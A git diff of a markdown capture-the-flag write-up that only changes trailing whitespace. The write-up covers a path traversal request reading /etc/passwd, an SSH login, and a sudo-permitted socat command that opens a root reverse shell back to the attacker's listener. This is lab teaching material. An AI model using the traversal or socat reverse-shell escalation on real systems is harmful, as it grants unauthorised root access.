@@ -36,27 +36,27 @@ Nmap done: 1 IP address (1 host up) scanned in 28.87 seconds
 
     Let's try Directory Traversal / Path Traversal attack by calling:  
     `http://10.10.56.74/article?name=../../../../etc/passwd`  
-    This GET request returns the content of passwd:
-    ![passwd](passwd.png)
+    This GET request returns the content of passwd:  
+    ![passwd](passwd.png)  
     
     By inspecting the content, the user `falconfeast` is found with SSH access.  
-    Now login using SSH
+    Now login using SSH  
     ![ssh falconfeas@t10.10.56.74](ssh.png)
 
-    user flag found
+    user flag found  
     ![cat user.txt](user.png)
 
 1. **root flag**  
 
-    On the remote host run the command `sudo -l` to find which  check what the user falconfeast can run as sudo.
-    ![sudo -l](sudo.png)
+    On the remote host run the command `sudo -l` to find which  check what the user falconfeast can run as sudo.  
+    ![sudo -l](sudo.png)  
 
-    Google to learn more about socat.
+    Google to learn more about socat.  
 
-    To install socat on mac first install [brew](https://brew.sh/) and then run the command `brew install socat`.
+    To install socat on mac first install [brew](https://brew.sh/) and then run the command `brew install socat`.  
 
     **Gaining root acess**  
-    First get your local VPN IP address by running ifconfig, on my computer it's found under utun2.
+    First get your local VPN IP address by running ifconfig, on my computer it's found under utun2.  
 
     On your local machine run the command ```socat file:`tty`,raw,echo=0tcp-listen:41337```  
 
@@ -66,9 +66,9 @@ Nmap done: 1 IP address (1 host up) scanned in 28.87 seconds
     and then finally run the command  
     `sudo /usr/bin/socat tcp-connect:$RHOST:$RPORT exec:sh,pty,stderr,setsid,sigint,sane`  
 
-    Go back to your local terminal and verify that connection has been etablished.
-    ![socat](socat.png)
+    Go back to your local terminal and verify that connection has been etablished.  
+    ![socat](socat.png)  
     
-    Now cd to root directory and cat the root.txt
+    Now cd to root directory and cat the root.txt  
 
-    Done!
+    Done!  
